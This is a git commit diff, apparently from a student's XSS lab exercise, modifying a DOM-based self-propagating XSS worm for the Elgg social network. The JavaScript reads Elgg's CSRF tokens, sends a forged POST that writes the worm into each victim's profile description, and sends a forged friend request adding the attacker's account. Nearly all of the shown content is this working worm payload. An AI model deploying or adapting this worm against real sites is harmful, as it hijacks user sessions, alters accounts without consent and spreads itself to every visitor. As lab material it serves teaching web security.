3584af5ce033e00805ef96febbbf767445fa11d7
Francesco <fifreda@hotmail.it>
2022-11-16 18:01:07 +0100

    task 6 xss done

--- XSS_Lab-20221114/xss_worm_dom.js
+++ XSS_Lab-20221114/xss_worm_dom.js
@@ -10,24 +10,25 @@
         var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
         var token="&__elgg_token="+elgg.security.token.__elgg_token;
         //Construct the content of your url.
-        var about_me = "YOU HAVE BEEN HACKED BY SAMY WORM! :)";
+        //var about_me = "YOU HAVE BEEN HACKED BY SAMY WORM! :)+\n"+wormCode
         //Propagate the xss attack to other users
         var samyGuid="59"; //FILL IN
+        var about_me = "<p>YOU HAVE BEEN HACKED BY SAMY WORM! :)</p>"
         var sendurl="/action/profile/edit"; //FILL IN
-        var content=token+ts+guid+userName+"&description="+about_me; //FILL IN
+        var content=token+ts+guid+userName+"&description="+about_me+wormCode; //FILL IN
         if(elgg.session.user.guid != samyGuid) { // (1)
             //Create and send Ajax request to modify profile
             var Ajax=null;
+            Ajax=new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            Ajax.send(content);
             //Construct the HTTP request to add Samy as a friend.
             sendurl="/action/friends/add?friend="+samyGuid+ts+token+ts+token; //FILL IN
             //Create and send Ajax request to add friend
             Ajax=new XMLHttpRequest();
             Ajax.open("GET", sendurl, true);
             Ajax.send();
-            Ajax=new XMLHttpRequest();
-            Ajax.open("POST", sendurl, true);
-            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            Ajax.send(wormCode);
         }
     }
 </script>
